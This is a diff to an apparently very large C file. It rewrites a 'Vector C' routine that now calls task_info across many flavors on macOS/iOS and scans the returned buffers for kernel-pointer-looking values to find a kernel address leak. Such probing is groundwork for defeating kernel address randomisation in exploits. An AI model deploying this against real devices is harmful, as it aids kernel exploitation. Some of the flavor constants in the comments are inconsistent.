@@ -17153,44 +17153,55 @@ static void r441_probe(void) {
     }
     fflush(stdout);
 
-    /* Vector C: csops syscall — codesigning info might contain kernel data */
-    rlog("\n  --- Vector C: csops for kernel data ---\n");
+    /* Vector C: task_info + thread_info for kernel data */
+    rlog("\n  --- Vector C: task_info flavors for kernel data ---\n");
     {
-        /* csops(pid, ops, useraddr, usersize) = syscall 169 */
-        typedef int (*csops_fn)(pid_t, unsigned int, void*, size_t);
-        csops_fn csops = (csops_fn)dlsym(RTLD_DEFAULT, "csops");
+        task_t task = mach_task_self();
 
-        if (csops) {
-            /* CS_OPS_STATUS=0, CS_OPS_ENTITLEMENTS_BLOB=7, CS_OPS_IDENTITY=11 */
-            unsigned int ops[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
-            for (int i = 0; i < 16; i++) {
-                uint8_t buf[4096];
-                memset(buf, 0, sizeof(buf));
-                int ret = csops(getpid(), ops[i], buf, sizeof(buf));
-                if (ret == 0) {
-                    /* Scan for kernel pointers */
-                    uint64_t *qw = (uint64_t*)buf;
-                    int kptrs = 0;
-                    /* Check how much data was returned (find last non-zero) */
-                    int last_nz = 0;
-                    for (int j = 0; j < 512; j++) {
-                        if (qw[j] != 0) last_nz = j;
+        /* Try TASK_BASIC_INFO=5, TASK_EVENTS_INFO=2, TASK_THREAD_TIMES_INFO=3,
+           TASK_VM_INFO=22, TASK_ABSOLUTETIME_INFO=1, TASK_KERNELMEMORY_INFO=7,
+           TASK_BASIC_INFO_64=5, TASK_POWER_INFO=21, TASK_POWER_INFO_V2=26,
+           TASK_VM_INFO_PURGEABLE=23, TASK_FLAGS_INFO=33, TASK_WAIT_STATE_INFO=34 */
+        int flavors[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+                         21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35};
+        int nf = sizeof(flavors)/sizeof(flavors[0]);
+
+        for (int fi = 0; fi < nf; fi++) {
+            natural_t info[256];
+            mach_msg_type_number_t count = 256;
+            kern_return_t kr = task_info(task, flavors[fi], (task_info_t)info, &count);
+            if (kr == KERN_SUCCESS && count > 0) {
+                rlog("    task_info(%d): count=%u (%u bytes)\n", flavors[fi], count, count*4);
+                uint64_t *qw = (uint64_t*)info;
+                int kptrs = 0;
+                for (unsigned i = 0; i < (count * 4) / 8; i++) {
+                    if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      +%d: 0x%016llx ← KPTR!\n", (int)(i*8), (unsigned long long)qw[i]);
+                        kptrs++;
                     }
-                    if (last_nz > 0) {
-                        rlog("    csops(%u): ret=0, data_end=+%d\n", ops[i], (last_nz+1)*8);
-                        for (int j = 0; j <= last_nz && j < 8; j++) {
-                            rlog("      +%d: 0x%016llx%s\n", j*8, (unsigned long long)qw[j],
-                                 (qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " ← KPTR!" : "");
-                        }
-                        for (int j = 0; j <= last_nz; j++) {
-                            if ((qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) kptrs++;
-                        }
-                        if (kptrs > 0) rlog("      KPTRS: %d\n", kptrs);
+                }
+                if (kptrs == 0 && count >= 4) {
+                    rlog("      first: 0x%016llx 0x%016llx\n",
+                         (unsigned long long)qw[0], (unsigned long long)qw[1]);
+                }
+            }
+        }
+
+        /* TASK_VM_INFO (flavor 22) is the richest — dump it fully */
+        {
+            natural_t vminfo[256];
+            mach_msg_type_number_t count = 256;
+            kern_return_t kr = task_info(task, 22, (task_info_t)vminfo, &count);
+            if (kr == KERN_SUCCESS) {
+                rlog("    TASK_VM_INFO full dump (%u ints):\n", count);
+                uint64_t *qw = (uint64_t*)vminfo;
+                for (unsigned i = 0; i < (count * 4) / 8 && i < 32; i++) {
+                    if (qw[i] != 0) {
+                        rlog("      +%d: 0x%016llx%s\n", (int)(i*8), (unsigned long long)qw[i],
+                             (qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " ← KPTR!" : "");
                     }
                 }
             }
-        } else {
-            rlog("    csops not found\n");
         }
     }
     fflush(stdout);
